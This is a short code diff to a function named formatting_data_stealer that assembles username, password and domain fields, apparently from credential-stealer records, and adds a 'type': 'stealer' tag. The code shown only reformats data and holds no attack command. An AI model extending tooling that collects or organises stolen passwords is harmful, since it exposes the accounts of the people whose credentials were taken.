@@ -38,6 +38,7 @@ def formatting_data_stealer(data):
         "username": username,
         "password": data.get("password", ""),
         "domain": domain,
+        "type": "stealer"
     }
     
     return newData
